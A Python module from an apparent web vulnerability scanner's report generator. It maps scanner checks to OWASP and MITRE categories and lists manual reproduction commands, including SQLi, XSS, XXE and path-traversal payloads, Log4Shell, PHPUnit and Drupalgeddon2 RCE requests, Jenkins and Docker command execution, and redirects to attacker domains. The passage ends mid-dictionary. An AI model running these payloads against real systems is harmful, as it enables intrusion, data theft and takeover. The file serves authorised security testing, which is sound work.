"""Standar industri tambahan untuk report (OWASP / MITRE / Reproduksi).

File ini melengkapi `explainer.py` (yang sudah berisi friendly_name,
what_it_means, business_impact untuk semua 105 modul) dengan:

  * OWASP_MAP   - kategori OWASP Top 10 2021 per modul
  * MITRE_MAP   - teknik MITRE ATT&CK per modul
  * REPRO_MAP   - perintah/langkah reproduksi manual (curl, dig, dst.)

Konten ini dipakai oleh PDF reporter untuk memperkaya tiap finding.
Modul yang tidak ada di sini akan jatuh ke fallback generik.

Note:
- Mapping OWASP/MITRE diturunkan dari modul yang dijalankan, bukan
  hanya dari CWE per finding (CWE_TO_OWASP di Finding model sudah
  meng-cover yang itu).
- Glossary istilah ada di explainer.GLOSSARY (jangan duplikasi di sini).
"""
from __future__ import annotations

# --------------------------- OWASP Top 10 2021 ---------------------------
OWASP_MAP: dict[str, str] = {
    # Recon
    "dns": "Informasional",
    "whois": "Informasional",
    "ports": "A05:2021 Security Misconfiguration",
    "subdomains": "Informasional",
    "subdomain_takeover": "A05:2021 Security Misconfiguration",
    "fingerprint": "A06:2021 Vulnerable & Outdated Components",
    "api_discovery": "A05:2021 Security Misconfiguration",
    "crawler": "Informasional",
    "email_security": "A02:2021 Cryptographic Failures",
    "email_security_extended": "A02:2021 Cryptographic Failures",
    "nextjs_specific": "A05:2021 Security Misconfiguration",
    "cf_origin": "A05:2021 Security Misconfiguration",
    "wayback": "Informasional",
    "framework_default": "A05:2021 Security Misconfiguration",
    "graphql_deep": "A09:2021 Security Logging & Monitoring Failures",
    "source_leak": "A05:2021 Security Misconfiguration",
    "cms_scan": "A06:2021 Vulnerable & Outdated Components",
    "cloud_buckets": "A05:2021 Security Misconfiguration",
    "k8s_exposure": "A05:2021 Security Misconfiguration",
    "dependency_confusion": "A08:2021 Software & Data Integrity Failures",
    "favicon_hash": "Informasional",

    # Passive
    "headers": "A05:2021 Security Misconfiguration",
    "tls": "A02:2021 Cryptographic Failures",
    "cookies": "A07:2021 Identification & Authentication Failures",
    "cors": "A05:2021 Security Misconfiguration",
    "clickjacking": "A05:2021 Security Misconfiguration",
    "methods": "A05:2021 Security Misconfiguration",
    "sensitive_files": "A05:2021 Security Misconfiguration",
    "robots": "A05:2021 Security Misconfiguration",
    "csrf": "A01:2021 Broken Access Control",
    "jwt": "A02:2021 Cryptographic Failures",
    "outdated_libs": "A06:2021 Vulnerable & Outdated Components",
    "mixed_content": "A02:2021 Cryptographic Failures",
    "csp_evaluator": "A05:2021 Security Misconfiguration",
    "captcha_check": "A07:2021 Identification & Authentication Failures",
    "cache_control_audit": "A04:2021 Insecure Design",
    "cors_advanced": "A05:2021 Security Misconfiguration",
    "cookie_scope": "A07:2021 Identification & Authentication Failures",
    "sentry_dsn_leak": "A05:2021 Security Misconfiguration",
    "server_timing_header": "Informasional",
    "api_key_in_url": "A02:2021 Cryptographic Failures",
    "autocomplete_audit": "A04:2021 Insecure Design",
    "exif_leak": "A01:2021 Broken Access Control",
    "homoglyph_check": "A04:2021 Insecure Design",

    # Active - Injection
    "sqli": "A03:2021 Injection",
    "nosqli": "A03:2021 Injection",
    "xss": "A03:2021 Injection",
    "stored_xss": "A03:2021 Injection",
    "dom_xss": "A03:2021 Injection",
    "cmdi": "A03:2021 Injection",
    "ldap_injection": "A03:2021 Injection",
    "xpath_injection": "A03:2021 Injection",
    "xslt_injection": "A03:2021 Injection",
    "ssti": "A03:2021 Injection",
    "log_injection": "A09:2021 Security Logging & Monitoring Failures",
    "csv_injection": "A03:2021 Injection",
    "crlf_injection": "A03:2021 Injection",
    "response_splitting": "A03:2021 Injection",
    "deserialization": "A08:2021 Software & Data Integrity Failures",

    # Active - Access control
    "redirect": "A01:2021 Broken Access Control",
    "lfi": "A01:2021 Broken Access Control",
    "dirlist": "A05:2021 Security Misconfiguration",
    "host_header": "A05:2021 Security Misconfiguration",
    "ssrf": "A10:2021 Server-Side Request Forgery (SSRF)",
    "ssrf_metadata": "A10:2021 Server-Side Request Forgery (SSRF)",
    "url_preview_ssrf": "A10:2021 Server-Side Request Forgery (SSRF)",
    "xxe": "A05:2021 Security Misconfiguration",
    "idor_generic": "A01:2021 Broken Access Control",
    "mass_assignment": "A04:2021 Insecure Design",
    "auth_bypass": "A07:2021 Identification & Authentication Failures",
    "private_profile_bypass": "A01:2021 Broken Access Control",
    "media_persistence": "A01:2021 Broken Access Control",
    "dm_privacy": "A01:2021 Broken Access Control",
    "social_csrf": "A01:2021 Broken Access Control",
    "logout_csrf": "A01:2021 Broken Access Control",
    "rate_limit_bypass": "A07:2021 Identification & Authentication Failures",
    "captcha_bypass": "A07:2021 Identification & Authentication Failures",
    "unicode_bypass": "A04:2021 Insecure Design",

    # Active - Auth & session
    "session": "A07:2021 Identification & Authentication Failures",
    "otp_check": "A07:2021 Identification & Authentication Failures",
    "password_reset": "A07:2021 Identification & Authentication Failures",
    "jwt_confusion": "A02:2021 Cryptographic Failures",
    "oauth_check": "A07:2021 Identification & Authentication Failures",
    "oauth_takeover": "A07:2021 Identification & Authentication Failures",
    "webhook_signature": "A08:2021 Software & Data Integrity Failures",

    # Active - Money / fraud / business logic
    "voucher": "A04:2021 Insecure Design",
    "payment": "A04:2021 Insecure Design",
    "balance": "A04:2021 Insecure Design",
    "race_condition": "A04:2021 Insecure Design",
    "timing_attack": "A02:2021 Cryptographic Failures",

    # Active - Misc
    "forms": "A04:2021 Insecure Design",
    "file_upload": "A05:2021 Security Misconfiguration",
    "zip_slip": "A01:2021 Broken Access Control",
    "cache_poison": "A05:2021 Security Misconfiguration",
    "hpp": "A05:2021 Security Misconfiguration",
    "rfd": "A05:2021 Security Misconfiguration",
    "pii_leak": "A02:2021 Cryptographic Failures",
    "proto_pollution": "A03:2021 Injection",
    "http_smuggling": "A05:2021 Security Misconfiguration",
    "ws_check": "A05:2021 Security Misconfiguration",
    "env_leak": "A05:2021 Security Misconfiguration",
    "api_auth": "A07:2021 Identification & Authentication Failures",
    "graphql_dos": "A04:2021 Insecure Design",

    # Simulate
    "rate_limit": "A07:2021 Identification & Authentication Failures",
    "burst": "A04:2021 Insecure Design",
}

# --------------------------- MITRE ATT&CK --------------------------------
MITRE_MAP: dict[str, str] = {
    # Recon
    "dns": "T1590.002 DNS",
    "whois": "T1591 Gather Victim Org Information",
    "ports": "T1046 Network Service Discovery",
    "subdomains": "T1590.005 IP Addresses",
    "subdomain_takeover": "T1584 Compromise Infrastructure",
    "fingerprint": "T1592.002 Software",
    "api_discovery": "T1190 / T1083",
    "crawler": "T1592 Gather Victim Host Information",
    "email_security": "T1589 Gather Victim Identity Information",
    "email_security_extended": "T1589.002 Email Addresses",
    "nextjs_specific": "T1592.002 Software",
    "cf_origin": "T1090 Proxy",
    "wayback": "T1593.003 Code Repositories",
    "framework_default": "T1592.002 Software",
    "graphql_deep": "T1190 Exploit Public-Facing Application",
    "source_leak": "T1213 Data from Information Repositories",
    "cms_scan": "T1592.002 Software",
    "cloud_buckets": "T1530 Data from Cloud Storage",
    "k8s_exposure": "T1213 Data from Information Repositories",
    "dependency_confusion": "T1195.001 Compromise Software Dependencies",
    "favicon_hash": "T1592 (Recon)",

    # Passive
    "headers": "T1190 Exploit Public-Facing Application",
    "tls": "T1040 Network Sniffing",
    "cookies": "T1539 Steal Web Session Cookie",
    "cors": "T1190 Exploit Public-Facing Application",
    "clickjacking": "T1204 User Execution",
    "methods": "T1190 Exploit Public-Facing Application",
    "sensitive_files": "T1083 File and Directory Discovery",
    "robots": "T1083 File and Directory Discovery",
    "csrf": "T1204 User Execution",
    "jwt": "T1606 Forge Web Credentials",
    "outdated_libs": "T1190 Exploit Public-Facing Application",
    "mixed_content": "T1557 Adversary-in-the-Middle",
    "csp_evaluator": "T1190 Exploit Public-Facing Application",
    "captcha_check": "T1110 Brute Force",
    "cache_control_audit": "T1530 Data from Cloud Storage",
    "cors_advanced": "T1190 Exploit Public-Facing Application",
    "cookie_scope": "T1539 Steal Web Session Cookie",
    "sentry_dsn_leak": "T1552 Unsecured Credentials",
    "server_timing_header": "T1592 Gather Victim Host Information",
    "api_key_in_url": "T1552.001 Credentials In Files",
    "autocomplete_audit": "T1212 Exploitation for Credential Access",
    "exif_leak": "T1592 Gather Victim Host Information",
    "homoglyph_check": "T1583.001 Domains",

    # Active - Injection
    "sqli": "T1190 Exploit Public-Facing Application",
    "nosqli": "T1190 Exploit Public-Facing Application",
    "xss": "T1059.007 JavaScript",
    "stored_xss": "T1059.007 JavaScript (persistent)",
    "dom_xss": "T1059.007 JavaScript (DOM)",
    "cmdi": "T1059 Command and Scripting Interpreter",
    "ldap_injection": "T1190 Exploit Public-Facing Application",
    "xpath_injection": "T1190 Exploit Public-Facing Application",
    "xslt_injection": "T1190 Exploit Public-Facing Application",
    "ssti": "T1190 / T1059 Code Injection",
    "log_injection": "T1565.001 Stored Data Manipulation",
    "csv_injection": "T1204.002 Malicious File",
    "crlf_injection": "T1190 Exploit Public-Facing Application",
    "response_splitting": "T1190 Exploit Public-Facing Application",
    "deserialization": "T1190 / T1059 Deserialization RCE",

    # Active - Access control
    "redirect": "T1566 Phishing",
    "lfi": "T1083 / T1005 Data from Local System",
    "dirlist": "T1083 File and Directory Discovery",
    "host_header": "T1190 Exploit Public-Facing Application",
    "ssrf": "T1090 Proxy / T1552 Unsecured Credentials",
    "ssrf_metadata": "T1552.005 Cloud Instance Metadata API",
    "url_preview_ssrf": "T1090 Proxy",
    "xxe": "T1005 Data from Local System",
    "idor_generic": "T1078 Valid Accounts",
    "mass_assignment": "T1078 Valid Accounts",
    "auth_bypass": "T1212 Exploitation for Credential Access",
    "private_profile_bypass": "T1078 Valid Accounts",
    "media_persistence": "T1530 Data from Cloud Storage",
    "dm_privacy": "T1213 Data from Information Repositories",
    "social_csrf": "T1204 User Execution",
    "logout_csrf": "T1204 User Execution",
    "rate_limit_bypass": "T1110 Brute Force",
    "captcha_bypass": "T1110 Brute Force",
    "unicode_bypass": "T1027 Obfuscated Files or Information",

    # Active - Auth & session
    "session": "T1539 Steal Web Session Cookie",
    "otp_check": "T1111 Multi-Factor Authentication Interception",
    "password_reset": "T1556 Modify Authentication Process",
    "jwt_confusion": "T1606 Forge Web Credentials",
    "oauth_check": "T1528 Steal Application Access Token",
    "oauth_takeover": "T1528 Steal Application Access Token",
    "webhook_signature": "T1566.002 Spearphishing Link",

    # Active - Money / fraud / business logic
    "voucher": "T1499 Endpoint Denial of Service",
    "payment": "T1565.003 Runtime Data Manipulation",
    "balance": "T1565.003 Runtime Data Manipulation",
    "race_condition": "T1499 Endpoint Denial of Service",
    "timing_attack": "T1040 Network Sniffing",

    # Active - Misc
    "forms": "T1190 Exploit Public-Facing Application",
    "file_upload": "T1190 / T1505.003 Web Shell",
    "zip_slip": "T1574 Hijack Execution Flow",
    "cache_poison": "T1565.001 Stored Data Manipulation",
    "hpp": "T1190 Exploit Public-Facing Application",
    "rfd": "T1204.002 Malicious File",
    "pii_leak": "T1213 Data from Information Repositories",
    "proto_pollution": "T1059.007 JavaScript",
    "http_smuggling": "T1190 Exploit Public-Facing Application",
    "ws_check": "T1190 Exploit Public-Facing Application",
    "env_leak": "T1552.001 Credentials In Files",
    "api_auth": "T1190 Exploit Public-Facing Application",
    "graphql_dos": "T1499.003 Application Exhaustion Flood",

    # Simulate
    "rate_limit": "T1110 Brute Force",
    "burst": "T1499 Endpoint Denial of Service",
}

# --------------------------- Cara Reproduksi -----------------------------
# Placeholder {url} dan {host} akan diganti otomatis oleh PDF reporter.
REPRO_MAP: dict[str, str] = {
    # Recon
    "dns": "dig {host} ANY\ndig {host} TXT\ndig {host} MX\nnslookup -type=ANY {host}",
    "whois": "whois {host}",
    "ports": (
        "nmap -sV -p- --min-rate=1000 {host}\n"
        "# Service umum yang bahaya kalau terbuka tanpa auth:\n"
        "redis-cli -h {host}\nmongosh --host {host}\ncurl http://{host}:9200/"
    ),
    "subdomains": "subfinder -d {host} -all\namass enum -d {host}",
    "subdomain_takeover": (
        "dig CNAME {host}\ncurl -i https://{host}/\n"
        "# CNAME ke vendor + body 'No such bucket' = takeover candidate"
    ),
    "fingerprint": "curl -I {url}\nwhatweb {url}",
    "api_discovery": "curl -i {url}/swagger-ui.html\ncurl -i {url}/v3/api-docs",
    "cf_origin": "# Coba akses langsung ke origin via Censys/Shodan",
    "wayback": "curl 'https://web.archive.org/cdx/search/cdx?url=*.{host}/*&output=text&fl=original'",
    "graphql_deep": (
        "curl -X POST {url}/graphql -H 'Content-Type: application/json' \\\n"
        "  -d '{{\"query\":\"{{ __schema {{ types {{ name }} }} }}\"}}'"
    ),
    "cloud_buckets": "curl -I https://{host}.s3.amazonaws.com/",
    "k8s_exposure": "curl -k {url}/api/v1/namespaces\ncurl -k {url}:10250/pods",
    "favicon_hash": "# Pakai shodan: shodan search 'http.favicon.hash:<hash>'",
    "framework_default": "curl -I {url}",
    "source_leak": "curl -I {url}/.git/HEAD\ncurl -I {url}/.svn/entries",

    # Passive
    "headers": (
        "curl -I {url}\n"
        "# Header keamanan minimum:\n"
        "#   Strict-Transport-Security, Content-Security-Policy,\n"
        "#   X-Content-Type-Options, X-Frame-Options, Referrer-Policy."
    ),
    "tls": (
        "openssl s_client -connect {host}:443 -tls1_2 -servername {host}\n"
        "openssl s_client -connect {host}:443 -tls1   # WAJIB GAGAL\n"
        "# atau: ./testssl.sh {host}"
    ),
    "cookies": "curl -i {url}\n# Cookie session WAJIB: Secure; HttpOnly; SameSite=Lax",
    "cors": (
        "curl -i -H 'Origin: https://evil.example.com' {url}\n"
        "# Bila reflect Origin + Allow-Credentials: true -> exploitable"
    ),
    "cors_advanced": "curl -i -H 'Origin: https://attacker.{host}' {url}",
    "clickjacking": "# Buat iframe HTML: <iframe src='{url}'></iframe>",
    "methods": "curl -X TRACE {url}\ncurl -X PUT {url} -d 'test'\ncurl -X OPTIONS -i {url}",
    "sensitive_files": "curl -I {url}/.git/HEAD\ncurl -I {url}/.env\ncurl -I {url}/backup.zip",
    "robots": "curl {url}/robots.txt\ncurl {url}/sitemap.xml",
    "csrf": "# Buat halaman attacker dengan form auto-submit ke endpoint POST",
    "jwt": (
        "1. Decode token di https://jwt.io\n"
        "2. Bila alg=none -> ubah payload, hapus signature\n"
        "3. Bila HS256 -> brute-force: hashcat -m 16500 token.txt rockyou.txt"
    ),
    "outdated_libs": "# Bandingkan versi library di response dengan https://nvd.nist.gov",
    "mixed_content": "# Buka {url} di Chrome F12, filter 'Mixed Content'",
    "csp_evaluator": "# Pakai https://csp-evaluator.withgoogle.com",
    "captcha_check": "# Coba submit form berulang tanpa solve captcha",
    "cache_control_audit": "curl -i {url}",
    "cookie_scope": "# Periksa Domain & Path di Set-Cookie",
    "sentry_dsn_leak": "# Cari pattern https://[hash]@[org].ingest.sentry.io di JS",
    "server_timing_header": "curl -I {url}",
    "api_key_in_url": "# Cari pattern api_key= / token= di URL hasil crawl",
    "autocomplete_audit": "# Periksa autocomplete='off' pada input password",
    "exif_leak": "exiftool <gambar.jpg>",
    "homoglyph_check": "# Bandingkan host {host} dengan domain populer (lookalike)",

    # Active - Injection
    "sqli": (
        "curl \"{url}\"\ncurl \"{url}'\"            # tambah quote\n"
        "curl \"{url}' OR '1'='1\"\n"
        "# Verifikasi pakai sqlmap (HARUS dengan izin):\n"
        "  sqlmap -u \"{url}\" --batch --risk=1 --level=2"
    ),
    "nosqli": "curl \"{url}?username[$ne]=admin&password[$ne]=x\"",
    "xss": (
        "Buka {url}?q=<script>alert(document.domain)</script>\n"
        "Bila alert muncul -> Reflected XSS terkonfirmasi."
    ),
    "stored_xss": "# Submit payload XSS ke field profile/komentar, akses sebagai user lain",
    "dom_xss": "# Pakai DOM Invader (Burp) atau cari sink innerHTML/document.write",
    "cmdi": "# Tambah ke parameter: ;sleep 5  |sleep 5  `sleep 5`  $(sleep 5)",
    "ldap_injection": "# Coba: *)(uid=*  atau  *)(|(uid=*",
    "xpath_injection": "# Coba: ' or '1'='1  atau  '] | //*[@user='admin",
    "xslt_injection": "# Submit XML dengan elemen XSLT yang membaca system-property",
    "ssti": (
        "# Test payload sederhana per template engine:\n"
        "#   {{7*7}}    (Jinja2/Twig)  ->  49\n"
        "#   ${{7*7}}   (FreeMarker)\n"
        "#   <%= 7*7 %> (ERB)"
    ),
    "log_injection": "# Submit input dengan newline + entry palsu",
    "csv_injection": "# Submit input dengan =SUM(1+1) atau @SUM(1+1)",
    "crlf_injection": "curl \"{url}/%0d%0aSet-Cookie:session=evil\"",
    "response_splitting": "curl \"{url}/?x=foo%0d%0aLocation:%20//evil\"",
    "deserialization": "# Pakai ysoserial untuk Java, atau payload pickle Python",

    # Active - Access control & SSRF
    "redirect": "curl -I \"{url}?next=//evil.example.com\"",
    "lfi": "curl \"{url}/../../../../etc/passwd\"\ncurl \"{url}?file=../../../../etc/passwd%00\"",
    "dirlist": "# Buka {url}, lihat apakah tampil daftar file/folder",
    "host_header": (
        "curl -H 'Host: evil.example.com' {url}\n"
        "curl -H 'X-Forwarded-Host: evil.example.com' {url}"
    ),
    "ssrf": (
        "# Ganti parameter URL/callback/webhook dengan:\n"
        "#   http://127.0.0.1:80/\n"
        "#   file:///etc/passwd"
    ),
    "ssrf_metadata": (
        "# HANYA dengan izin tertulis:\n"
        "#   http://169.254.169.254/latest/meta-data/   (AWS)\n"
        "#   http://metadata.google.internal/           (GCP)"
    ),
    "url_preview_ssrf": "# Submit URL ke endpoint preview (chat/share) -> arah ke 127.0.0.1",
    "xxe": (
        "# POST XML body:\n"
        "#   <!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>"
    ),
    "idor_generic": "# Akses /api/users/123 sebagai user 124, lihat apakah data lain bocor",
    "mass_assignment": "# POST registrasi dengan tambahan field 'isAdmin=true' / 'role=admin'",
    "auth_bypass": "# Coba: header X-Forwarded-For: 127.0.0.1; bypass via /admin/..;/",
    "private_profile_bypass": "# Akses URL profile private via API call lain (mobile API, share link)",
    "media_persistence": "# Setelah hapus media, coba akses URL CDN-nya. Masih ada -> bug.",
    "dm_privacy": "# Coba akses /api/messages/<id> milik user lain",
    "social_csrf": "# Buat halaman attacker dengan form auto-submit ke aksi sosial (follow/post)",
    "logout_csrf": "# <img src='{url}/logout'> di halaman attacker",
    "rate_limit_bypass": "# Coba header X-Forwarded-For rotasi, atau case sensitivity di endpoint",
    "captcha_bypass": "# Submit form dengan captcha kosong / response captcha bekas",
    "unicode_bypass": "# Coba IDN homograph: пaypal.com (Cyrillic 'a') vs paypal.com",

    # Active - Auth & session
    "session": "# Login 2 sesi paralel, periksa apakah session ID dapat diprediksi",
    "otp_check": "# Coba submit OTP berulang (brute), atau request OTP ulang banyak kali",
    "password_reset": (
        "1. Trigger reset password dengan email user korban.\n"
        "2. Periksa apakah link reset bisa dipakai berulang / lintas user.\n"
        "3. Coba ubah Host header -> link reset mengarah ke domain attacker."
    ),
    "jwt_confusion": "# Ubah alg dari RS256 ke HS256, sign dengan public key sebagai secret",
    "oauth_check": "# Periksa redirect_uri whitelist; coba //attacker.com / open redirect",
    "oauth_takeover": "# Pakai akun OAuth attacker dengan email yang sama -> account merge",
    "webhook_signature": "# Submit webhook tanpa header signature / dengan signature lama",

    # Active - Money / fraud / business logic
    "voucher": "# Apply voucher yang sudah dipakai; apply 2x bersamaan (race)",
    "payment": (
        "# Tampering payload checkout: ubah amount, currency, atau status menjadi 'paid'.\n"
        "# Periksa juga apakah verifikasi server-side benar-benar terjadi."
    ),
    "balance": "# Withdraw lebih besar dari balance via race condition",
    "race_condition": (
        "# Pakai Burp Turbo Intruder atau curl -- parallel:\n"
        "#   for i in $(seq 1 30); do curl '{url}' & done"
    ),
    "timing_attack": "# Ukur waktu respons login antara user yang ada vs tidak ada",

    # Active - Misc
    "forms": "# Test setiap form input dengan payload XSS/SQLi standar",
    "file_upload": (
        "# Upload file shell.php.jpg, lalu akses URL upload-nya.\n"
        "# Variasi: shell.php%00.jpg, shell.pHp, double extension."
    ),
    "zip_slip": "# Upload zip dengan path ../../../../etc/cron.d/evil",
    "cache_poison": "# Inject header X-Forwarded-Host evil di request cacheable",
    "hpp": "curl '{url}?id=1&id=2'",
    "rfd": "curl '{url}/api;/foo.bat?cb=evil()'",
    "pii_leak": "# Akses endpoint /api/users tanpa auth atau dengan low-priv",
    "proto_pollution": "# Submit JSON dengan __proto__.<key> = value",
    "http_smuggling": "# Pakai smuggler.py atau smuggle.py untuk test TE.CL / CL.TE",
    "ws_check": "wscat -c wss://{host}/socket",
    "env_leak": "curl -I {url}/.env\ncurl -I {url}/config/.env",
    "api_auth": "# Akses /api/admin/* tanpa Authorization header",
    "graphql_dos": (
        "# Pakai query nested berlebihan:\n"
        "#   {{ posts {{ comments {{ author {{ posts {{ ... }} }} }} }} }}"
    ),

    # Simulate
    "rate_limit": (
        "1. Otomatisasi 20 percobaan login dengan password salah ke endpoint login.\n"
        "2. Bila tidak ada lockout/CAPTCHA setelah N percobaan -> rate-limit absen."
    ),
    "burst": "# Kirim 100 request paralel dengan ab atau hey, lihat apakah ada throttle",
}



# =====================================================================
# Cyberloka v0.10.0 — 30 modul scanner active baru (CRITICAL / HIGH)
# Setiap modul melakukan validasi celah otomatis (tanpa pengecekan manual).
# =====================================================================

OWASP_MAP.update({
    "apache_path_confusion": "A05:2021 Security Misconfiguration",
    "phpunit_rce":           "A06:2021 Vulnerable & Outdated Components",
    "log4shell_probe":       "A06:2021 Vulnerable & Outdated Components",
    "spring_actuator_rce":   "A05:2021 Security Misconfiguration",
    "gitlab_unauth_api":     "A01:2021 Broken Access Control",
    "jenkins_unauth_console":"A01:2021 Broken Access Control",
    "wp_xmlrpc_amplify":     "A07:2021 Identification & Authentication Failures",
    "drupalgeddon2":         "A06:2021 Vulnerable & Outdated Components",
    "bypass_403":            "A01:2021 Broken Access Control",
    "docker_remote_api":     "A05:2021 Security Misconfiguration",
    "elasticsearch_unauth":  "A05:2021 Security Misconfiguration",
    "prometheus_unauth":     "A05:2021 Security Misconfiguration",
    "grafana_default_login": "A07:2021 Identification & Authentication Failures",
    "kibana_unauth":         "A05:2021 Security Misconfiguration",
    "solr_admin_unauth":     "A05:2021 Security Misconfiguration",
    "adminer_exposed":       "A05:2021 Security Misconfiguration",
    "phpmyadmin_exposed":    "A05:2021 Security Misconfiguration",
    "iis_shortname":         "A05:2021 Security Misconfiguration",
    "cache_deception":       "A05:2021 Security Misconfiguration",
    "cors_null_origin":      "A05:2021 Security Misconfiguration",
    "smtp_header_injection": "A03:2021 Injection",
    "oauth_redirect_bypass": "A01:2021 Broken Access Control",
    "s3_world_writable":     "A05:2021 Security Misconfiguration",
    "firebase_open_db":      "A01:2021 Broken Access Control",
    "csti_template":         "A03:2021 Injection",
    "api_version_downgrade": "A07:2021 Identification & Authentication Failures",
    "grpc_reflection":       "A05:2021 Security Misconfiguration",
    "saml_metadata_exposed": "A05:2021 Security Misconfiguration",
    "webdav_writable":       "A01:2021 Broken Access Control",
    "nginx_off_by_slash":    "A01:2021 Broken Access Control",
})

MITRE_MAP.update({
    "apache_path_confusion": "T1190 Exploit Public-Facing Application",
    "phpunit_rce":           "T1190 / T1059 Code Injection",
    "log4shell_probe":       "T1190 Exploit Public-Facing Application",
    "spring_actuator_rce":   "T1552.001 Credentials In Files",
    "gitlab_unauth_api":     "T1213 Data from Information Repositories",
    "jenkins_unauth_console":"T1059 Command and Scripting Interpreter",
    "wp_xmlrpc_amplify":     "T1110.003 Password Spraying",
    "drupalgeddon2":         "T1190 Exploit Public-Facing Application",
    "bypass_403":            "T1190 / T1078 Valid Accounts",
    "docker_remote_api":     "T1610 Deploy Container",
    "elasticsearch_unauth":  "T1213 Data from Information Repositories",
    "prometheus_unauth":     "T1592 Gather Victim Host Information",
    "grafana_default_login": "T1078.001 Default Accounts",
    "kibana_unauth":         "T1213 Data from Information Repositories",
    "solr_admin_unauth":     "T1190 Exploit Public-Facing Application",
    "adminer_exposed":       "T1190 / T1110 Brute Force",
    "phpmyadmin_exposed":    "T1190 / T1110 Brute Force",
    "iis_shortname":         "T1083 File and Directory Discovery",
    "cache_deception":       "T1530 Data from Cloud Storage",
    "cors_null_origin":      "T1190 Exploit Public-Facing Application",
    "smtp_header_injection": "T1566.002 Spearphishing Link",
    "oauth_redirect_bypass": "T1528 Steal Application Access Token",
    "s3_world_writable":     "T1485 Data Destruction",
    "firebase_open_db":      "T1530 Data from Cloud Storage",
    "csti_template":         "T1059.007 JavaScript",
    "api_version_downgrade": "T1078 Valid Accounts",
    "grpc_reflection":       "T1592 Gather Victim Host Information",
    "saml_metadata_exposed": "T1592 Gather Victim Host Information",
    "webdav_writable":       "T1505.003 Web Shell",
    "nginx_off_by_slash":    "T1083 File and Directory Discovery",
})

REPRO_MAP.update({
    "apache_path_confusion": (
        "curl --path-as-is -s '{url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'\n"
        "# Bila body memuat 'root:x:0:0:' = path traversal terkonfirmasi (CVE-2021-41773)."
    ),
    "phpunit_rce": (
        "curl -X POST '{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' \\\n"
        "  --data '<?php echo \"CYBLOK_RCE_\".md5(1); ?>'\n"
        "# Body harus memuat hash md5(1)=c4ca4238... = RCE (CVE-2017-9841)."
    ),
    "log4shell_probe": (
        "curl '{url}/' -H 'User-Agent: ${{jndi:ldap://canary.{host}/a}}'\n"
        "# Pakai canarytokens.org untuk konfirmasi callback DNS/LDAP."
    ),
    "spring_actuator_rce": (
        "curl -s '{url}/actuator/env' | jq .\n"
        "curl -s -O '{url}/actuator/heapdump'   # heapdump biasanya berisi secret"
    ),
    "gitlab_unauth_api": (
        "curl -s '{url}/api/v4/users?per_page=100' | jq '.[].username'\n"
        "curl -s '{url}/api/v4/projects?visibility=internal'"
    ),
    "jenkins_unauth_console": (
        "curl -s '{url}/script' | grep -i 'Groovy script'\n"
        "# Eksekusi (HANYA dengan izin):\n"
        "curl --data-urlencode 'script=println(\"id\".execute().text)' '{url}/scriptText'"
    ),
    "wp_xmlrpc_amplify": (
        "curl -s -X POST '{url}/xmlrpc.php' \\\n"
        "  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'\n"
        "# Bila berisi 'pingback.ping' = bisa dipakai SSRF/DDoS amplification."
    ),
    "drupalgeddon2": (
        "curl -X POST '{url}/?q=user/password&name[%23post_render][]=printf&name[%23markup]=CYBLOK&name[%23type]=markup' \\\n"
        "  --data 'form_id=user_pass&_triggering_element_name=name'\n"
        "# Cari token form_build_id, lalu trigger /file/ajax/name/#value/<token>."
    ),
    "bypass_403": (
        "curl -i '{url}/admin'\n"
        "curl -i '{url}/admin' -H 'X-Original-URL: /admin'\n"
        "curl -i '{url}/admin' -H 'X-Forwarded-For: 127.0.0.1'\n"
        "curl -i '{url}/admin/.'\n"
        "curl -i '{url}/admin/..;/'\n"
        "curl -i '{url}/admin%20'"
    ),
    "docker_remote_api": (
        "curl -s '{url}/version'\ncurl -s '{url}/containers/json' | jq .\n"
        "# RCE: docker -H tcp://{host}:2375 run -v /:/host alpine chroot /host sh"
    ),
    "elasticsearch_unauth": (
        "curl -s '{url}/_cluster/health?pretty'\n"
        "curl -s '{url}/_cat/indices?v'\ncurl -s '{url}/*/_search?size=10'"
    ),
    "prometheus_unauth": (
        "curl -s '{url}/metrics' | head -50\n"
        "curl -s '{url}/api/v1/targets'\n"
        "curl -s '{url}/api/v1/query?query=up'"
    ),
    "grafana_default_login": (
        "curl -s -c jar.txt -X POST '{url}/login' \\\n"
        "  -H 'Content-Type: application/json' \\\n"
        "  -d '{{\"user\":\"admin\",\"password\":\"admin\"}}'\n"
        "curl -s -b jar.txt '{url}/api/datasources'   # bila 200 = takeover."
    ),
    "kibana_unauth": (
        "curl -s '{url}/api/status'\n"
        "curl -s '{url}/app/home'   # cari string 'kbn-version' / 'window.__KBN__'"
    ),
    "solr_admin_unauth": (
        "curl -s '{url}/solr/admin/cores?action=STATUS&wt=json'\n"
        "# RCE klasik: VelocityResponseWriter -> /select?q=...&wt=velocity"
    ),
    "adminer_exposed": "curl -s '{url}/adminer.php' | grep -i adminer",
    "phpmyadmin_exposed": "curl -s '{url}/phpmyadmin/' | grep -i 'phpMyAdmin'",
    "iis_shortname": (
        "curl -s -o /dev/null -w '%{{http_code}}\\n' '{url}/*~1*/.aspx'\n"
        "# 404 vs 400 = tilde enumeration aktif. Pakai shortscan."
    ),
    "cache_deception": (
        "curl -i -b 'session=...' '{url}/profile'\n"
        "curl -i '{url}/profile/cyblok.css'\n"
        "# Bila /profile/cyblok.css membalas data privat user = cache deception."
    ),
    "cors_null_origin": (
        "curl -i -H 'Origin: null' '{url}/api/me'\n"
        "# Cek: Access-Control-Allow-Origin: null + Allow-Credentials: true"
    ),
    "smtp_header_injection": (
        "# POST ke endpoint kontak/share dengan field email berisi:\n"
        "#   victim@x.com%0d%0aBcc:%20attacker@evil.com\n"
        "# Validasi: email yang masuk ke Bcc evil.com = injection berhasil."
    ),
    "oauth_redirect_bypass": (
        "curl -I '{url}/oauth/authorize?response_type=code&client_id=...&redirect_uri=https://attacker.example.com'\n"
        "curl -I '{url}/oauth/authorize?...&redirect_uri=https://{host}.attacker.com'\n"
        "curl -I '{url}/oauth/authorize?...&redirect_uri=//attacker.com'"
    ),
    "s3_world_writable": (
        "aws s3 ls s3://{host} --no-sign-request\n"
        "echo CYBLOK > /tmp/c.txt && \\\n"
        "  aws s3 cp /tmp/c.txt s3://{host}/cyblok-poc.txt --no-sign-request\n"
        "curl 'https://{host}.s3.amazonaws.com/cyblok-poc.txt'"
    ),
    "firebase_open_db": (
        "curl -s 'https://<project>.firebaseio.com/.json'\n"
        "# Bila 200 + JSON data = rules public read. Coba PUT untuk write."
